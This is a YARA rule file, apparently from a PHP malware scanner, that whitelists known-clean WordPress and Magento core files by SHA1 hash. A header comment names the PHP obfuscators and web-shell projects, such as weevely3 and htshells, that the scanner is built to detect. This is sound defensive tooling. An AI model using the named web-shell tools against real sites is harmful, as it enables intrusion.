        /* Wordpress 4.3.14 */
        hash.sha1(0, filesize) == "7e68cbc4594bec9a37268be0a3153bc327964650" or // wp-includes/functions.php

        /* Wordpress 4.4 */
        hash.sha1(0, filesize) == "b7e5febb44afe5438ab5cf733bd0a02fc4f4b2a8" or // wp-includes/widgets/class-wp-widget-categories.php
        hash.sha1(0, filesize) == "7f9be8f15d5f0212376ecc0633fba1b7986e09c1" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "f0fa0a65ec23e011672c0c25a1130365bfc4dc35" or // wp-includes/class-wp-tax-query.php
        hash.sha1(0, filesize) == "d1c839dfbaaf2ddc4e4ae57d8bdb4316cd25c1a2" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "6eff1fd4e45d11c2785fd0be8cceb8e07269a072" or // wp-includes/class-wp-meta-query.php
        hash.sha1(0, filesize) == "9a6f07102ccc8c0c842f7e08441aa1f2d0500214" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "9180550308e961482e28a372f5c7eba70210295b" or // wp-includes/date.php
        hash.sha1(0, filesize) == "d679ead3f70be8642ee36c5d249fba8d7539eadf" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "d2a35d9a571975f972e28a5b5cc77e1370ada007" or // wp-admin/includes/class-wp-ms-themes-list-table.php
        hash.sha1(0, filesize) == "2fdf93ae88735d062a8635ac1d22a6904cb89ab8" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "086986cdf03ede58494034661d38c4842af38fe3" or // wp-includes/SimplePie/Parse/Date.php
        hash.sha1(0, filesize) == "9d6b7298c4724385732d3512526eb8e7a0f59d79" or // wp-includes/deprecated.php

        /* Wordpress 4.4.1 */
        hash.sha1(0, filesize) == "17659465ca029164a3cfa15517a5e0358cb59a6b" or // wp-includes/random_compat/random.php

        /* Wordpress 4.4.2 */
        hash.sha1(0, filesize) == "45ed235ed268d289665f8d0866cbbdbc46e1b25c" or // wp-includes/random_compat/random.php

        /* Wordpress 4.4.4 */
        hash.sha1(0, filesize) == "bb0ab626d7d5ed3fef7ea910d73f02b3159d8b31" or // wp-includes/post-template.php

        /* Wordpress 4.4.5 */
        hash.sha1(0, filesize) == "9076a0939127bd082bb9fd20099c243ee64d6c7e" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "65d8091dabdce10fddf855aa86994e7f6c206678" or // wp-admin/includes/upgrade.php

        /* Wordpress 4.4.6 */
        hash.sha1(0, filesize) == "bb5871932b7db7af34deefc2fa3e1c2c39ebfaac" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "0a6321cc5a95ba50ac065be6f863e410d4c753e6" or // wp-includes/functions.php

        /* Wordpress 4.4.7 */
        hash.sha1(0, filesize) == "324da3de8c2e95d4f1c833de7bb969cce65017a1" or // wp-includes/query.php

        /* Wordpress 4.4.8 */
        hash.sha1(0, filesize) == "f23c04db16a26cfdd7698354b5b5e4e5ba8d2c3c" or // wp-admin/includes/media.php

        /* Wordpress 4.4.9 */
        hash.sha1(0, filesize) == "b81c17d5bfb2223f69db377436590e475668d2fb" or // wp-admin/includes/media.php

        /* Wordpress 4.4.10 */
        hash.sha1(0, filesize) == "6dcfcae19ae1dfcef701a7c503819da7f5a5e462" or // wp-admin/includes/file.php

        /* Wordpress 4.4.11 */
        hash.sha1(0, filesize) == "d150111d53bb9b5c3b206dd20bbab4aa6392c535" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "0568c09891c5373289adf8edddbe9315f3191e43" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "e96fad2bedc2f6b16db3ca35c6fda177c7fead4a" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "4a65846751a2fd28d1580eec7c8f44a8e13765ee" or // wp-includes/embed.php

        /* Wordpress 4.4.12 */
        hash.sha1(0, filesize) == "8febc587284d4883ff685ba8e82cd4aa834dc054" or // wp-includes/post.php

        /* Wordpress 4.4.13 */
        hash.sha1(0, filesize) == "b9a2912fb6fbb5c0955a652988f0f0d16bde9b7d" or // wp-includes/functions.php

        /* Wordpress 4.5 */
        hash.sha1(0, filesize) == "acfaa92b755ecda6ee1d1e7ee5bb5c3376b8a6be" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "fba38139c928803094190dc600b81e99aa5589fc" or // wp-includes/class-wp-tax-query.php
        hash.sha1(0, filesize) == "87f8099b00084af257135f4bee2b0d70d9e367a6" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "e049dd771d6b3abf7c4e65413e32de744b42ccef" or // wp-includes/class-wp-meta-query.php
        hash.sha1(0, filesize) == "1ad46b79725d495bb5aa40325325caa206c14fc8" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "73740e2cfb355a7eb7b1044c7d44135b40b01fa6" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "7978619626d7ba0022430be3fd697664203d5154" or // wp-includes/date.php

        /* Wordpress 4.5.1 */
        hash.sha1(0, filesize) == "0b952ece357cf396d9df043f852d9c5c4e0b8a3e" or // wp-includes/post-template.php

        /* Wordpress 4.5.3 */
        hash.sha1(0, filesize) == "9ee0b7f989f1776c6cee94beca98bb4a68760a16" or // wp-includes/post-template.php

        /* Wordpress 4.5.4 */
        hash.sha1(0, filesize) == "682c5bdb4f42bc1b45311cb061e86a7f73d1b851" or // wp-admin/includes/media.php

        /* Wordpress 4.5.5 */
        hash.sha1(0, filesize) == "eab6afde1cb93b4a88970848df53394c9bed0106" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "3b83dfdfdd3740b7153fa89f563da0585fcdd39d" or // wp-includes/functions.php

        /* Wordpress 4.5.6 */
        hash.sha1(0, filesize) == "b37095354be3483d3bde870aa1312993c197d433" or // wp-includes/query.php

        /* Wordpress 4.5.7 */
        hash.sha1(0, filesize) == "fc11c12de9b20b22adbd0c3dd757717bc24b6f1c" or // wp-admin/includes/media.php

        /* Wordpress 4.5.8 */
        hash.sha1(0, filesize) == "216425da339d17a4a3460a8e4e20c05f2dd9dcbb" or // wp-admin/includes/media.php

        /* Wordpress 4.5.9 */
        hash.sha1(0, filesize) == "ad7ebe534455b42c7c437878546ec7dbebf93ae6" or // wp-admin/includes/file.php

        /* Wordpress 4.5.10 */
        hash.sha1(0, filesize) == "939dda60ddad0b8d7aa74bf91b328cd501c1c132" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "b4be10610ff0649c48b9dba091656a7e479defe2" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "b50677d1200c0b7af34b94d7df071cd45435c5ee" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "7ff8a0bc84a84b31101630fc723f8b7c5df2b207" or // wp-includes/embed.php

        /* Wordpress 4.5.11 */
        hash.sha1(0, filesize) == "a244b842832525f376e9b0d0f4df4e56ed4302cd" or // wp-includes/post.php

        /* Wordpress 4.5.12 */
        hash.sha1(0, filesize) == "21bd227ab97fec4144bd7aad7bc400e3f51ab03d" or // wp-includes/functions.php

        /* Wordpress 4.6 */
        hash.sha1(0, filesize) == "a422a0e8243e8311d30bc01c2d7b9c283e61bff2" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "348c3a60d99768041be690b65b008628f53badb7" or // wp-includes/class-wp-tax-query.php
        hash.sha1(0, filesize) == "0c06bd6cf0a6658732efe87ff5640cd11c65f7f1" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "c06a15f4869c5459a782b714572eacea5c82d570" or // wp-includes/class-wp-meta-query.php
        hash.sha1(0, filesize) == "b10d12a372e6cffdc7d216f8a5136e3c093159a4" or // wp-includes/class-requests.php
        hash.sha1(0, filesize) == "0451d399ccfbf7dc1de0edb9f745da2b34b18fc5" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "d032ad82ff52219f3615da437c1b76b8f280aa12" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "b92aefa2917fc319ca7ceab092e183cafc651a6d" or // wp-includes/bookmark-template.php
        hash.sha1(0, filesize) == "4f89ccb066e38c1737c12b0617b2fb12da1ba049" or // wp-includes/date.php

        /* Wordpress 4.6.1 */
        hash.sha1(0, filesize) == "b1f9eb94fb54febccee7334620905adb4400aa9d" or // wp-admin/includes/media.php

        /* Wordpress 4.6.2 */
        hash.sha1(0, filesize) == "07d18fc3d5e5b0fd61ccf5bd2da8ac2e15b097e4" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "a53db6d4db11a0abb7e1fabfa6d25f5a993ebd53" or // wp-includes/class-requests.php
        hash.sha1(0, filesize) == "100410700eb586886eb21325f81e1b2294e56ac6" or // wp-includes/functions.php

        /* Wordpress 4.6.3 */
        hash.sha1(0, filesize) == "dc98c549dcb2cef2f59dd220d314db3ad0a17ba0" or // wp-includes/query.php

        /* Wordpress 4.6.4 */
        hash.sha1(0, filesize) == "6449e83f570f22b5379269f4ea131d32c402bed9" or // wp-admin/includes/media.php

        /* Wordpress 4.6.5 */
        hash.sha1(0, filesize) == "28be75a851213f0898383747a7d67b8ef2036c2f" or // wp-admin/includes/media.php

        /* Wordpress 4.6.6 */
        hash.sha1(0, filesize) == "1f50ee8f46458e2ea17326223d84ec51610dfe36" or // wp-admin/includes/file.php

        /* Wordpress 4.6.7 */
        hash.sha1(0, filesize) == "5db799480d4fd6ad9cdf32fdabb2ffcef9b283bc" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "ed7fd5cbc7cd9dd98fbaeb984278a96825174472" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "ba377822d0f3a65b6b7684b1ec337335155df119" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "7080f68308c148e7cded897ce169d4ebfee04bec" or // wp-includes/embed.php

        /* Wordpress 4.6.8 */
        hash.sha1(0, filesize) == "beaa64b3bdfa508a8b2ecadecbcbbeeed775c990" or // wp-includes/post.php

        /* Wordpress 4.6.9 */
        hash.sha1(0, filesize) == "1b924521222d5bdc75aac9c323901584c3c05d04" or // wp-includes/functions.php

        /* Wordpress 4.7 */
        hash.sha1(0, filesize) == "d39e8749e6e15b6fa86270381420cf4f4cc02ed4" or // wp-includes/post.php
        hash.sha1(0, filesize) == "12a18329072bed94b6f9c4d9f16d7a079ca64655" or // wp-admin/includes/ajax-actions.php
        hash.sha1(0, filesize) == "64e5d98fbeb07994f0d712ada765190656d4c0cb" or // wp-includes/comment.php
        hash.sha1(0, filesize) == "9835d10a7561deeef1f8381da065b4b45d7f2662" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "aa6a12a0325056b9649f58f8072fa02a1e264551" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "aee1d3ce95ffb5f1c7da03740c5328f35360b24a" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "82d279098626105b1019d68da8290a6c385781e7" or // wp-includes/class-phpmailer.php
        hash.sha1(0, filesize) == "2ef50e790fdd42daa8ccd64d4c7c4be75d21742d" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "455273700bc455f1ff36822affc94108dc3d9df7" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "1479b874ad86ce3b865ba34048a20b86d8aa0087" or // wp-includes/load.php
        hash.sha1(0, filesize) == "040ef40d245242723de200e494a27545ea0b121b" or // wp-includes/IXR/class-IXR-date.php
        hash.sha1(0, filesize) == "e11f0c01452b686bd7e144ce165dfc5c3a616461" or // wp-includes/media.php
        hash.sha1(0, filesize) == "e777699f876953380f9a1ce013a1ba55f838ab0b" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "da748d8ac26bd4148bb8972b93efbb5f808474aa" or // wp-includes/js/tinymce/tinymce.min.js
        hash.sha1(0, filesize) == "b77ca8384b23346d003c07d23f05b8161ab6c688" or // wp-includes/class-wp-query.php
        hash.sha1(0, filesize) == "c8c9182aa25fb92ca91fcc96c3419847acdcf6e0" or // wp-includes/date.php
        hash.sha1(0, filesize) == "c2530a7cdb250bf4825a5c112cd26aa3ef7db1b8" or // wp-includes/functions.php
        hash.sha1(0, filesize) == "81b1ae432ba765a43c6d81fb6d6c35ce72efd0e8" or // wp-admin/includes/schema.php
        hash.sha1(0, filesize) == "6bccf04c8b46c8d6cdf79db8b509f4b76689f3bf" or // wp-admin/includes/class-ftp.php
        hash.sha1(0, filesize) == "5877695771fbe7a5667f4a06f4d897a37ef3fceb" or // wp-includes/deprecated.php
        hash.sha1(0, filesize) == "e4f0694bc96f99d5e30201171a3e7fc86e9e5ae4" or // wp-includes/class-pop3.php
        hash.sha1(0, filesize) == "3d365a162b340d34d5294b60ae547d99b6d1a999" or // wp-admin/includes/file.php

        /* Wordpress 4.7.1 */
        hash.sha1(0, filesize) == "5ddc1e5c5c6302211b1aecbf930f76417b65d678" or // wp-includes/post.php
        hash.sha1(0, filesize) == "0aab95245b9668f954151f4312b678fb0ee798cf" or // wp-includes/comment.php
        hash.sha1(0, filesize) == "abcf1a0801694db4774cd2abb29b5392e10dd632" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "cb0c5a355409d807202bbf52749a3e74a9967a6a" or // wp-includes/class-phpmailer.php
        hash.sha1(0, filesize) == "f53f80c4ee7446f0b605443b6d2f05acd8064d13" or // wp-includes/load.php
        hash.sha1(0, filesize) == "b6de3af806166117e7bba3eccbb0428a1616b52d" or // wp-includes/media.php
        hash.sha1(0, filesize) == "8e46ab4eae3aac3295b24f4aaf4e57931817e49d" or // wp-includes/functions.php

        /* Wordpress 4.7.2 */
        hash.sha1(0, filesize) == "72dbc1d4f2bbc8efdcdd834ecaf3771cbf17f64e" or // wp-includes/class-wp-query.php

        /* Wordpress 4.7.3 */
        hash.sha1(0, filesize) == "806d2872676ea22e0a6fa6b32fbd4652298023ee" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "bea5ea598f537e7acb20b77a1421f819c0a9ec75" or // wp-includes/media.php
        hash.sha1(0, filesize) == "3e73204644f0ce7b0971aad885fdcbcabba629fc" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "3083b9a58e76d42455935811a457f29f57620145" or // wp-includes/functions.php

        /* Wordpress 4.7.4 */
        hash.sha1(0, filesize) == "b29188f218f4c5a829885acda14b0311a3c49976" or // wp-includes/media.php
        hash.sha1(0, filesize) == "314b1dc97aa00586a3252d3628cf229e65091340" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "ec167428ad6275ff373976847c37fca99b9a485d" or // wp-includes/js/tinymce/tinymce.min.js
        hash.sha1(0, filesize) == "f0944ef1c459ddb52365c3825b09063b323eed92" or // wp-includes/functions.php

        /* Wordpress 4.7.5 */
        hash.sha1(0, filesize) == "165ad1321538d1b599923f0757f7d7e21671e155" or // wp-admin/includes/file.php

        /* Wordpress 4.7.6 */
        hash.sha1(0, filesize) == "b152b4bf6a81a3ba3564ae276a34bc6b4877735b" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "e527a7eae5b3465b00087fa7c333e9606ae5783a" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "e59258f4773caf6fda6c99e125436ad4a18ce486" or // wp-includes/embed.php
        hash.sha1(0, filesize) == "235a7ad0f3f8478e652def99d8e1f4307dc51da2" or // wp-admin/includes/file.php

        /* Wordpress 4.7.7 */
        hash.sha1(0, filesize) == "eb855acc1c8666a70f3d7dfe4a95c00149b5ce7d" or // wp-includes/post.php

        /* Wordpress 4.7.8 */
        hash.sha1(0, filesize) == "ac0958364783141c5a1cbba8e12ed4ff78ee8bbd" or // wp-includes/functions.php

        /* Wordpress 4.8 */
        hash.sha1(0, filesize) == "77313344a17eade5030fdca8d10eccd135969369" or // wp-includes/post.php
        hash.sha1(0, filesize) == "173fbee8c74055b574ed0aa3c46e259197c67863" or // wp-includes/class-wp-tax-query.php
        hash.sha1(0, filesize) == "125c1f096353629f73beea143e2deca0df1fb7d4" or // wp-admin/includes/ajax-actions.php
        hash.sha1(0, filesize) == "1e2c69cb9905adf368b355ca9364b5e837dd9081" or // wp-includes/comment.php
        hash.sha1(0, filesize) == "5334c1a43da016ec1c29a51004e026080691b1bb" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "b9fa254d7c067cef7bad75e0b29fbefa7e413b57" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "0e7fa010303cd090cbe016b77e277927d1d6c810" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "cd711fb5b3bae492508beb9074a03046f7b1e308" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "ee46ecb6fde0592f9b7659e3d3484343d324b5b1" or // wp-includes/load.php
        hash.sha1(0, filesize) == "36602ee5cdab5a4d3823eb6059309905198f4f36" or // wp-includes/media.php
        hash.sha1(0, filesize) == "ded6a7a07bced8e6499e88fb7b9d6db280851772" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "d72fdb3558631f5b120d04a2cad627751ae7d0f6" or // wp-includes/js/tinymce/tinymce.min.js
        hash.sha1(0, filesize) == "c241afff5aee586d3158386d7d8afb0eda43ffbc" or // wp-includes/class-wp-query.php
        hash.sha1(0, filesize) == "4ebfcc988918b5a97671d505181036ae2d1c32ab" or // wp-includes/date.php
        hash.sha1(0, filesize) == "dcdecd2367dc9a0cc60e678064803e6d93abcc6f" or // wp-includes/functions.php
        hash.sha1(0, filesize) == "f87e60432a7bd51476335bcb0f734f47b3ae1dc7" or // wp-admin/includes/schema.php
        hash.sha1(0, filesize) == "d330b08f706d98368b5a1acdcf2c8cdc72a0da4f" or // wp-includes/deprecated.php
        hash.sha1(0, filesize) == "2d68a100b60b49de00319e4787bf464007629fa4" or // wp-admin/includes/file.php

        /* Wordpress 4.8.1 */
        hash.sha1(0, filesize) == "1ec72b6f528082afbbadbf276a2dc438d1d594d5" or // wp-includes/media.php

        /* Wordpress 4.8.2 */
        hash.sha1(0, filesize) == "dfb85f5bdca223d49ecf73e6c9ca200abf937f51" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "dedbeabb84a350640f07a06ec4c50cff9ffa0d38" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "8aaa1c4bf15cd3abd78b91832fbbb4f0c6f31105" or // wp-admin/includes/file.php

        /* Wordpress 4.8.3 */
        hash.sha1(0, filesize) == "ae6db64375d5093431624468c91cfeaf3c71e1de" or // wp-includes/post.php
        hash.sha1(0, filesize) == "cf9b905e6559cb063e8472a8ae6de3a1ac4fa5bb" or // wp-includes/formatting.php

        /* Wordpress 4.8.4 */
        hash.sha1(0, filesize) == "bc5c48ca6e599f5891caf8a73608cdae9e01f478" or // wp-includes/functions.php

        /* Wordpress 4.9 */
        hash.sha1(0, filesize) == "752dbdfd22d3f940d8973d26923ca4a464f7e232" or // wp-includes/post.php
        hash.sha1(0, filesize) == "d1d684a2acbbd7f6660702e45d34ad96bdeef730" or // wp-includes/class-wp-tax-query.php
        hash.sha1(0, filesize) == "352be1f3bf3401a75eacdec37f1b5d48910043e8" or // wp-admin/includes/ajax-actions.php
        hash.sha1(0, filesize) == "9e19ca132977845fb0ba0950a507c16579093209" or // wp-includes/comment.php
        hash.sha1(0, filesize) == "18620d3e3b0b1f5b211ebc45ac5842eca7ee52ca" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "b9e78dc47e999b2b043e905c8a569e82a3bf7c0b" or // wp-admin/includes/class-wp-plugins-list-table.php
        hash.sha1(0, filesize) == "0b8cc5ee744280b8ed7f7e3b303e64b37a425cc4" or // wp-includes/ID3/module.tag.id3v2.php
        hash.sha1(0, filesize) == "f6033d27f76e4c5c974baa9936ab81d962558669" or // wp-includes/post-template.php
        hash.sha1(0, filesize) == "d0db3bdbb33277faa392f0d242125af1f761afc4" or // wp-admin/includes/template.php
        hash.sha1(0, filesize) == "dee6af2c81118c5021e1ee40e2d4b5c54934b167" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "7a4a73acfa113b77119c1daa6d67dfb83b2f463a" or // wp-includes/general-template.php
        hash.sha1(0, filesize) == "554b828b64160c6e56a5bebb1726efc72582005f" or // wp-includes/load.php
        hash.sha1(0, filesize) == "2d26a3a13fe4bcacee99b03ff96e06940a496744" or // wp-includes/ID3/getid3.lib.php
        hash.sha1(0, filesize) == "54a8fa6a2f55c29b9904b15ee276faeb200941c2" or // wp-includes/media.php
        hash.sha1(0, filesize) == "bede201836018278fa19d1f42bd564090c7a8b82" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "4108ea39a8332614c72e49b3ddf7a22c91e579ed" or // wp-includes/js/tinymce/tinymce.min.js
        hash.sha1(0, filesize) == "c172576a5a72e64e5af86820e11c02cfd334c654" or // wp-includes/class-wp-meta-query.php
        hash.sha1(0, filesize) == "8da575eed6ff6828cb2aad8953ae51c52a272c36" or // wp-includes/class-wp-query.php
        hash.sha1(0, filesize) == "126d1d46140d5d92d115af6e5d04c622f5d0d982" or // wp-includes/date.php
        hash.sha1(0, filesize) == "f7d34d486258a152d508b4872a0775fe7b54d23b" or // wp-includes/ID3/getid3.php
        hash.sha1(0, filesize) == "f9a6d17f8369d9a8ed6929ae5375f860d834d70d" or // wp-includes/functions.php
        hash.sha1(0, filesize) == "dc19f236b6276ae5e82f31d78e4fcf77aae0676b" or // wp-includes/ID3/module.audio-video.quicktime.php
        hash.sha1(0, filesize) == "1a68d18ab476fd71e2bafc26221a83758f51e899" or // wp-admin/includes/schema.php
        hash.sha1(0, filesize) == "47c8c9b48ab200312544c744ccc4433c09e4b29f" or // wp-includes/embed.php
        hash.sha1(0, filesize) == "8506b66d830fe43c07bd8ba92b98059db9c4d609" or // wp-includes/deprecated.php
        hash.sha1(0, filesize) == "bb59faf1d6d247561348a2d6da76b3c9916fc5f6" or // wp-includes/widgets/class-wp-widget-categories.php
        hash.sha1(0, filesize) == "60956e23f5124ff4d78a37845478bdef17323234" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "6ea29825bd6ecc006db5b9f8fea84b08094adf01" or // wp-includes/ID3/module.audio-video.matroska.php

        /* Wordpress 4.9.1 */
        hash.sha1(0, filesize) == "a9a0d360e92828392b4fd1088b8f6b3b5edbd38a" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "c34674dbded99cf27a8389266d9b7cd4cd1c1cae" or // wp-includes/general-template.php
        hash.sha1(0, filesize) == "b0530df4cb23cb9e7a0f8ff0afbc83d6762ec5c3" or // wp-includes/functions.php
        hash.sha1(0, filesize) == "cd178c8d3a504a61bca31531983d8c3b9f720fcd" or // wp-admin/includes/file.php

        /* Wordpress 4.9.2 */
        hash.sha1(0, filesize) == "aa07d8be20c7d0274c723b9eb2f91cccb509329c" or // wp-includes/media.php
        hash.sha1(0, filesize) == "96fbd31e8c8116942100359cac8c719db1c8d79c" or // wp-admin/includes/media.php
        hash.sha1(0, filesize) == "fa8001bcc5ead72411b9de4f881d62f5fcdbad80" or // wp-includes/functions.php

        /* Wordpress 4.9.3 */
        hash.sha1(0, filesize) == "61c41a1fb7e12833749388f3973f1847151e3ca9" or // wp-includes/post.php
        hash.sha1(0, filesize) == "fda1e4f919ceb16b7884c9082a55dc9791d30864" or // wp-includes/formatting.php
        hash.sha1(0, filesize) == "4099e5ef9c7f0611be320412159e1897f7d4d0c2" or // wp-includes/general-template.php
        hash.sha1(0, filesize) == "d227ce33979c44e23f44e33c4d8966de21108098" or // wp-includes/js/tinymce/tinymce.min.js
        hash.sha1(0, filesize) == "7424b9306888a80c3450b7ddb206e73a7a3065c6" or // wp-includes/class-wp-query.php
        hash.sha1(0, filesize) == "b9efb83b07e47085458433840a5000fdfa4bc9aa" or // wp-includes/functions.php

        /* Wordpress 4.9.5 */
        hash.sha1(0, filesize) == "023c18ac2ff6dfd5e1e33e607e04101be41a56e1" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "d8ebdd1c5582034ea6462cfb44a2a6938317e87e" or // wp-includes/general-template.php
        hash.sha1(0, filesize) == "c3e9b219e53ed65e0a975b40167c387e67e93118" or // wp-includes/media.php
        hash.sha1(0, filesize) == "a6d9800de8df95ed52ea3eacb55596d424612429" or // wp-includes/functions.php

        /* Wordpress 4.9.6 */
        hash.sha1(0, filesize) == "edfc9e842657332c3c89ee70124bfe21f52b6846" or // wp-includes/post.php
        hash.sha1(0, filesize) == "2ecb5fc57fdc7a2bbf77abc2ffef836077b4a3be" or // wp-admin/includes/ajax-actions.php
        hash.sha1(0, filesize) == "4a1d1becfb1bbbf88d6ebade13534f792c5545bf" or // wp-includes/comment.php
        hash.sha1(0, filesize) == "1ca5556cba039dda41863834d66192260d567e1d" or // wp-admin/includes/upgrade.php
        hash.sha1(0, filesize) == "8fac5dc40941a1d266064deaa7a7874a0c382c7f" or // wp-admin/includes/file.php
        hash.sha1(0, filesize) == "517b24c44416efd9869ce4fefb0091c610b15cfb" or // wp-includes/media.php
        hash.sha1(0, filesize) == "f3de6a4510385cc8db3f653c1a4adcae99f68691" or // wp-includes/js/tinymce/tinymce.min.js
        hash.sha1(0, filesize) == "f1b8f6b703f5a3e52cdeb44e9d4dd259e5f2d5d5" or // wp-includes/functions.php
        hash.sha1(0, filesize) == "51e02f58216c17b6267f5e958498d493a6bcc40d"    // wp-admin/includes/schema.php

}

/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/

/*
    Detect:
        - phpencode.org
        - http://www.pipsomania.com/best_php_obfuscator.do
        - http://atomiku.com/online-php-code-obfuscator/
        - http://www.webtoolsvn.com/en-decode/
        - http://obfuscator.uk/example/
        - http://w3webtools.com/encode-php-online/
        - http://www.joeswebtools.com/security/php-obfuscator/
        - https://github.com/epinna/weevely3
        - http://cipherdesign.co.uk/service/php-obfuscator
        - http://sysadmin.cyklodev.com/online-php-obfuscator/
        - http://mohssen.org/SpinObf.php
        - https://code.google.com/p/carbylamine/
        - https://github.com/tennc/webshell

        - https://github.com/wireghoul/htshells

    Thanks to:
        - https://stackoverflow.com/questions/3115559/exploitable-php-functions
*/
private rule Magento : ECommerce
{
    condition:
        /* Magento 1.14.2.0 */
        hash.sha1(0, filesize)  == "039ad85dc5940947849f7fe1a179563c829403ab" or // lib/PEAR/XML/Parser/Simple.php
        hash.sha1(0, filesize)  == "5f577c2a35ababbf39e0efb53294e5adf523822b" or // lib/PEAR/XML/Serializer.php
        hash.sha1(0, filesize)  == "27f0e4b1a09e816e40f9e6396c2d4a3cabdb2797" or // lib/PEAR/XML/Parser.php
        hash.sha1(0, filesize)  == "258522ff97a68138daf0566786b22e722c0ff520" or // lib/PEAR/XML/Unserializer.php
        hash.sha1(0, filesize)  == "a90d7f679a41443d58d5a96bcb369c3196a19538" or // iib/PEAR/SOAP/Base.php
        hash.sha1(0, filesize)  == "7faa31f0ee66f32a92b5fd516eb65ff4a3603156" or // lib/PEAR/SOAP/WSDL.php
        hash.sha1(0, filesize)  == "6b3f32e50343b70138ce4adb73045782b3edd851" or // lib/phpseclib/Net/SSH1.php
        hash.sha1(0, filesize)  == "ea4c5c75dc3e4ed53c6b9dba09ad9d23f10df9d5" or // lib/phpseclib/Crypt/Rijndael.php
        hash.sha1(0, filesize)  == "eb9dd8ec849ef09b63a75b367441a14ca5d5f7ae" or // lib/phpseclib/Crypt/Hash.php
        hash.sha1(0, filesize)  == "a52d111efd3b372104ebc139551d2d8516bbf5e0" or // lib/phpseclib/Crypt/RSA.php

        /* Magento 1.13.0.0 */
        hash.sha1(0, filesize)  == "988006fe987a3c192d74b355a5011326f7728d60" or // lib/PEAR/PEAR/PEAR.php
        hash.sha1(0, filesize)  == "0747f27fd0469608d1686abeaf667d9ad2b4c214" or // lib/PEAR/Mail/mime.php
        hash.sha1(0, filesize)  == "6c0b33527f8e4b0cab82fc9ba013549f945fad75" or // lib/PEAR/SOAP/Transport/HTTP.php
        hash.sha1(0, filesize)  == "9a340997bddbee19c1ec9ed62aa3b7e7a39d620a" or // lib/PEAR/PEAR.php
        hash.sha1(0, filesize)  == "a11e09ee903fe2a1f8188b27186d2dd5098419af" or // app/code/core/Mage/Adminhtml/Model/Url.php
        hash.sha1(0, filesize)  == "c60a936b7a532a171b79e17bfc3497de1e3e25be" or // app/code/core/Mage/Dataflow/Model/Profile.php
        hash.sha1(0, filesize)  == "9947a190e9d82a2e7a887b375f4b67a41349cc7f" or // app/code/core/Mage/Core/Model/Translate.php
        hash.sha1(0, filesize)  == "5fe6024f5c565a7c789de28470b64ce95763e3f4" or // cron.php

        /* Magento 1.9.2.0 */
        hash.sha1(0, filesize)  == "4fa9deecb5a49b0d5b1f88a8730ce20a262386f7" or // lib/Zend/Session.php
        hash.sha1(0, filesize)  == "f214646051f5376475d06ef50fe1e5634285ba1b" or // app/code/core/Mage/Adminhtml/Model/Url.php

        /* Magento 1.7.0.2 */
        hash.sha1(0, filesize)  == "f46cf6fd47e60e77089d94cca5b89d19458987ca" or // lib/Zend/Session.php
        hash.sha1(0, filesize)  == "ffb3e46c87e173b1960e50f771954ebb1efda66e" or // lib/Zend/Ldap/Converter.php
        hash.sha1(0, filesize)  == "7faa31f0ee66f32a92b5fd516eb65ff4a3603156" or // lib/PEAR/SOAP/WSDL.php
        hash.sha1(0, filesize)  == "539de72a2a424d86483f461a9e38ee42df158f26" or // app/code/core/Mage/Adminhtml/Model/Url.php
        hash.sha1(0, filesize)  == "6b3f32e50343b70138ce4adb73045782b3edd851" or // lib/phpseclib/Net/SSH1.php

        /* Magento 1.4.1.1 */
        hash.sha1(0, filesize)  == "0b74f4b259c63c01c74fb5913c3ada87296107c8" or // lib/Zend/Session.php
        hash.sha1(0, filesize)  == "951a4639e49c6b2ad8adeb38481e2290297c8e70" or // lib/Zend/Ldap/Converter.php
